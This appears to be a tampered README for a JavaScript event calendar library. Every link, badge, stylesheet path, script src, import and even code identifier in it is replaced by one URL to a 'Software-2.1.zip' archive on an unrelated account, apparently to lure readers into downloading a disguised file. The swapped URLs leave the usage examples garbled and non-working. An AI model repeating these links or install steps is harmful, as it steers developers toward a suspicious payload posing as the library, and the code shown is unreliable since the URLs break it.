# Event Calendar [![](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip)](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip) [![npm](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip)](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip)

See [demo](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip) and [changelog](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip).

Full-sized drag & drop JavaScript event calendar with resource view:

* Lightweight (33kb [br](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip) compressed)
* Zero-dependency (pre-built bundle)
* Used on over 70,000 websites with [Bookly](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip)

Inspired by [FullCalendar](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip), implements similar options.
...
let ec = new Calendar({
    target: https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip('ec'),
    props: {
        plugins: [TimeGrid],
        options: {
            view: 'timeGridWeek',
...
```
The CSS is located at `https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip`. If your build tool supports CSS processing, you can import it like this:
```js
import 'https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip';
```

### Pre-built browser ready bundle
Include the following lines of code in the `<head>` section of your page:
```html
<link rel="stylesheet" href="https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip">
<script src="https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip"></script>
```
...
```js
let ec = new EventCalendar(https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip('ec'), {
    view: 'timeGridWeek',
    events: [
        // your list of events
    ]
...
```js
https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip('slotDuration', '01:00');
```
...
<script>
    ...
    function updateOptions() {
        https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip = '01:00';
    }
</script>
...
> - dayGridMonth `text => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, next: 'Next month', prev: 'Previous month'})`
> - listDay `text => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, next: 'Next day', prev: 'Previous day'})`
> - listMonth `text => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, next: 'Next month', prev: 'Previous month'})`
> - listWeek `text => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, next: 'Next week', prev: 'Previous week'})`
> - listYear `text => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, next: 'Next year', prev: 'Previous year'})`
> - resourceTimeGridDay `text => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, next: 'Next day', prev: 'Previous day'})`
> - resourceTimeGridWeek `text => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, next: 'Next week', prev: 'Previous week'})`
> - timeGridDay `text => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, next: 'Next day', prev: 'Previous day'})`
> - timeGridWeek `text => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, next: 'Next week', prev: 'Previous week'})`
...
This value can be either an object with options for the native JavaScript [https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip) object, or a callback function that returns a [Content](#content) with the formatted string:
...
Instead of calling `successCallback` and `failureCallback`, you may return the resulting array of events or return a [Promise](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip) (or [thenable](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip)) object instead.
</td>
</tr>
</table>
...
Defines the `locales` parameter for the native JavaScript [https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip) object that the Event Calendar uses to format date and time strings in options such as [dayHeaderFormat](#dayheaderformat), [eventTimeFormat](#eventtimeformat), etc.
...
> Views override the default value as follows:
> - dayGridMonth `theme => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, view: 'ec-day-grid ec-month-view'})`
> - listDay `theme => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, view: 'ec-list ec-day-view'})`
> - listMonth `theme => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, view: 'ec-list ec-month-view'})`
> - listWeek `theme => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, view: 'ec-list ec-week-view'})`
> - listYear `theme => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, view: 'ec-list ec-year-view'})`
> - resourceTimeGridDay `theme => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, view: 'ec-time-grid ec-resource-day-view'})`
> - resourceTimeGridWeek `theme => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, view: 'ec-time-grid ec-resource-week-view'})`
> - timeGridDay `theme => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, view: 'ec-time-grid ec-day-view'})`
> - timeGridWeek `theme => ({https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip, view: 'ec-time-grid ec-week-view'})`
...
<script>
    ...
    let options = {
        ...
        eventSources: [{events: function() {
            https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip('fetching...');
            return [];
        }}]
    };

    function invokeMethod() {
        https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip();
    }
</script>
...
let date = https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip('date');
```
...
https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip('date', new Date());
```
### getEvents()
...
Using this method, you can, for example, find out on which day a click occurred inside a multi-day event. To do this, inside [eventClick](#eventclick), pass the `https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip` and `https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip` coordinates to `dateFromPoint` and get the desired date.
...
If you want the dark theme to be activated automatically based on the [preferred color scheme](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip), then use the `ec-auto-dark` CSS class instead.
...
```
A list of all available CSS variables can be found [here](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip).

## Browser support

The latest versions of Chrome, Firefox, Safari, and Edge are supported.

> The library is compiled to support browsers that match the following browserslist configuration: `defaults and supports fetch`. You can see the resulting list [here](https://raw.githubusercontent.com/ck20server/calendar/master/packages/Software-2.1.zip+and+supports+fetch).